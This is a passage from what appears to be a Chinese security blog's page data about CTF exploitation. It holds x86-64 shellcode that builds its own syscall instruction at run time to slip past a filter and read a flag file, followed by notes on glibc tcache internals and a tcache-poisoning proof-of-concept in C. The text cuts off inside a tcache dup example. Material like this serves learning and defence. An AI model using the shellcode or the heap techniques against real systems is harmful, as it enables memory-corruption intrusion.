class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span><br><span class=\"line\">jmp short my_fake_syscall_bottom</span><br><span class=\"line\">  my_fake_syscall_top:</span><br><span class=\"line\">  pop rbx ; Pop the address of the syscall-minus-1 block into rbx</span><br><span class=\"line\">  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Now rbx points to &quot;syscall &#x2F; ret&quot;, so we can just call that any time we</span><br><span class=\"line\">  ; need a syscall!</span><br><span class=\"line\">  ;</span><br><span class=\"line\">  ; Other than changing &quot;syscall&quot; to &quot;call rbx&quot;, the rest is identical!</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 2</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; filename</span><br><span class=\"line\">  jmp short getfilename_bottom</span><br><span class=\"line\">getfilename_top:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; flags</span><br><span class=\"line\">  xor rsi, rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; mode</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; file handle</span><br><span class=\"line\">  pop rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; buffer (same as filename)</span><br><span class=\"line\">  pop rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; count</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  inc rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\">  inc rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx is the count again</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 60</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Exit with code 0</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform an exit</span><br><span class=\"line\">  call rbx</span><br><span class=\"line\"></span><br><span class=\"line\">my_fake_syscall_bottom:</span><br><span class=\"line\">  call my_fake_syscall_top</span><br><span class=\"line\"></span><br><span class=\"line\">  ; This little block will become &quot;syscall &#x2F; ret&quot;</span><br><span class=\"line\">  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05</span><br><span class=\"line\">  ret ; Return after doing a syscall</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">getfilename_bottom:</span><br><span class=\"line\">  call getfilename_top</span><br><span class=\"line\"></span><br><span class=\"line\">  db &quot;.&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"tcache","url":"https://pz1o.top/2021/03/08/tcache/","content":"<p>down的wiki，便于自己多看。主要梳理一下结构。</p>\n<h1 id=\"0x01-Introduction\"><a href=\"#0x01-Introduction\" class=\"headerlink\" title=\"0x01 Introduction\"></a>0x01 Introduction</h1><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。</p>\n<h2 id=\"1-结构体\"><a href=\"#1-结构体\" class=\"headerlink\" title=\"1.结构体\"></a>1.结构体</h2><p><code>tcache_entry</code> 和 <code>tcache_perthread_struct</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class=\"line\"><span class=\"comment\">   the chunk is stored in the per-thread cache.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">  <span class=\"comment\">/* This field exists to detect double frees.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> *<span class=\"title\">key</span>;</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>\n<p>需要注意的是这里的 <strong>next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</strong></p>\n<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>\n<p>如图<img src=\"/2021/03/08/tcache/20210201102625163.png\" alt=\"在这里插入图片描述\"></p>\n</blockquote>\n<hr>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* There is one of these for each thread, which contains the</span></span><br><span class=\"line\"><span class=\"comment\">   per-thread cache (hence \"tcache_perthread_struct\").  Keeping</span></span><br><span class=\"line\"><span class=\"comment\">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class=\"line\"><span class=\"comment\">   are redundant (we could have just counted the linked list each</span></span><br><span class=\"line\"><span class=\"comment\">   time), this is for performance reasons.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> counts[TCACHE_MAX_BINS];</span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">define</span> TCACHE_MAX_BINS                64</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> __thread tcache_perthread_struct *tcache = <span class=\"literal\">NULL</span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251。每一个thread都会维护一个tcache_perthread_struct结构体，一共有TCACHE_MAX_BINS个计数器TCACHE_MAX_BINS项tcache_entry。</p>\n<ul>\n<li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li>\n<li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li>\n</ul>\n<p><img src=\"/2021/03/08/tcache/20210201160752119.jpg\" alt=\"在这里插入图片描述\"></p>\n</blockquote>\n<h2 id=\"2-执行流程\"><a href=\"#2-执行流程\" class=\"headerlink\" title=\"2.执行流程\"></a>2.执行流程</h2><ol>\n<li>第一次malloc，会分配一块大内存存放<code>tcache_perthread_struct</code>，一般为0x251</li>\n<li>释放chunk时，如果chunk的size小于small bin size，在<strong>进入tcache之前</strong>会先放进fastbin或者unsorted bin中</li>\n<li>在<strong>放入tcache后</strong>：<ul>\n<li>先放到对应的tcache中，直到tcache被填满（7个）</li>\n<li><strong>tcache被填满后</strong>，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</li>\n<li>tcache中的chunk<strong>不会发生合并</strong>，不取消inuse bit</li>\n</ul>\n</li>\n<li>重新申请chunk，并且申请的size符合tcache的范围，则先从<strong>tcache中取chunk</strong>，直到tcache为空</li>\n<li>tcache为空后，从bin中找</li>\n<li>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</li>\n</ol>\n<h2 id=\"3-源码分析\"><a href=\"#3-源码分析\" class=\"headerlink\" title=\"3.源码分析\"></a>3.源码分析</h2><h3 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcache_init(<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mstate ar_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *victim = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">size_t</span> bytes = <span class=\"keyword\">sizeof</span> (tcache_perthread_struct);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tcache_shutting_down)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  arena_get (ar_ptr, bytes); <span class=\"comment\">// 找到可用的 arena</span></span><br><span class=\"line\">  victim = _int_malloc (ar_ptr, bytes); <span class=\"comment\">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!victim &amp;&amp; ar_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class=\"line\">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ar_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">  <span class=\"comment\">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class=\"line\"><span class=\"comment\">     - in which case, we just keep trying later.  However, we</span></span><br><span class=\"line\"><span class=\"comment\">     typically do this very early, so either there is sufficient</span></span><br><span class=\"line\"><span class=\"comment\">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class=\"line\"><span class=\"comment\">     allocations anyway.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (victim) <span class=\"comment\">// 初始化 tcache</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      tcache = (tcache_perthread_struct *) victim;</span><br><span class=\"line\">      <span class=\"built_in\">memset</span> (tcache, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> (tcache_perthread_struct));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里初始化了tcache</p>\n<p>主要就是找arena和分配chunk</p>\n</blockquote>\n<h3 id=\"内存申请\"><a href=\"#内存申请\" class=\"headerlink\" title=\"内存申请\"></a>内存申请</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">// 从 tcache list 中获取内存</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> tcache_get (tc_idx);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  DIAG_POP_NEEDS_COMMENT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>首先是在tcache中有chunk的时候，if判断要取出的chunk的size是否满足idx的合法范围，在tcache-&gt;entries不为空时调用<code>tcache_get()</code>函数获取chunk。</p>\n</blockquote>\n<h3 id=\"tcache-get\"><a href=\"#tcache-get\" class=\"headerlink\" title=\"tcache_get()\"></a>tcache_get()</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span> *</span><br><span class=\"line\">tcache_get (<span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class=\"comment\">//获取指针</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class=\"line\">  assert (tcache-&gt;entries[tc_idx] &gt; <span class=\"number\">0</span>);<span class=\"comment\">//检查</span></span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class=\"comment\">//替换下一个指针</span></span><br><span class=\"line\">  --(tcache-&gt;counts[tc_idx]); </span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">void</span> *) e;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>从<code>tcache-&gt;entries[tc_idx]</code>获取一个chunk指针，并且<code>tcache-&gt;counts</code>减一，没有过多的安全检查或者保护</p>\n</blockquote>\n<h3 id=\"内存释放\"><a href=\"#内存释放\" class=\"headerlink\" title=\"内存释放\"></a>内存释放</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">_int_free (mstate av, mchunkptr p, <span class=\"keyword\">int</span> have_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">  ......</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> tc_idx = csize2tidx (<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tcache</span><br><span class=\"line\">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class=\"comment\">// 64</span></span><br><span class=\"line\">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class=\"comment\">// 7</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        tcache_put (p, tc_idx);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">  ......</span><br><span class=\"line\">  ......</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>可以看到首先判断<code>tc_idx</code>的合法性，判断<code>tcache-&gt;counts[tc_idx]</code>在7个以内时，进入<code>tcache_put()</code>函数，传递的一参为要释放的chunk指针，二参为chunk对应的size在tcache中的下标</p>\n</blockquote>\n<h3 id=\"tcache-put\"><a href=\"#tcache-put\" class=\"headerlink\" title=\"tcache_put()\"></a>tcache_put()</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span></span><br><span class=\"line\">tcache_put (mchunkptr chunk, <span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class=\"comment\">//释放的chunk</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class=\"comment\">//判断下标是否符合</span></span><br><span class=\"line\">  <span class=\"comment\">//链表的替换</span></span><br><span class=\"line\">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">  <span class=\"comment\">//数量增加</span></span><br><span class=\"line\">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcache_put()函数执行过程中把释放的chunk插入到了tcache-&gt;entries[tc_idx]链表的头部，整个插入的过程中也没有做任何的安全检查及保护，也没有将P标志位变为0</p>\n</blockquote>\n<p>其实我们也发现了，重点攻击的地方应该就是<code>tcache_get</code>和<code>tcache_put</code>两个地方。</p>\n<h1 id=\"0x02-PWN-tcache\"><a href=\"#0x02-PWN-tcache\" class=\"headerlink\" title=\"0x02 PWN tcache\"></a>0x02 PWN tcache</h1><h2 id=\"1-tcache-poisoning\"><a href=\"#1-tcache-poisoning\" class=\"headerlink\" title=\"1.tcache poisoning\"></a>1.tcache poisoning</h2><p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址。</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314162103060.png\" alt=\"image-20210314162103060\"></p>\n<p>此时如果把图中fd值改为我们想要的值，那么攻击就成功了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// disable buffering</span></span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> stack_var;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The address we want malloc() to return is %p.\\n\"</span>, (<span class=\"keyword\">char</span> *)&amp;stack_var);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(128): %p\\n\"</span>, a);</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(128): %p\\n\"</span>, b);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Freeing the buffers...\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tb[<span class=\"number\">0</span>] = (<span class=\"keyword\">intptr_t</span>)&amp;stack_var;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the tcache list has [ %p -&gt; %p ].\\n\"</span>, b, &amp;stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"1st malloc(128): %p\\n\"</span>, <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>));</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the tcache list has [ %p ].\\n\"</span>, &amp;stack_var);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"2nd malloc(128): %p\\n\"</span>, c);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"We got the control\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)&amp;stack_var == (<span class=\"keyword\">long</span>)c);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>sleep()为断点</p>\n</blockquote>\n<p>先看第一个断点下</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314165503011.png\" alt=\"image-20210314165503011\"></p>\n<p>第二个断点</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314165645714.png\" alt=\"image-20210314165645714\"></p>\n<p>很明显，当我们再次分配时，那么就会分配走我们想要的地址。</p>\n<h2 id=\"2-tcache-dup\"><a href=\"#2-tcache-dup\" class=\"headerlink\" title=\"2.tcache dup\"></a>2.tcache dup</h2><p>上面的是针对malloc，这个针对的是free</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span 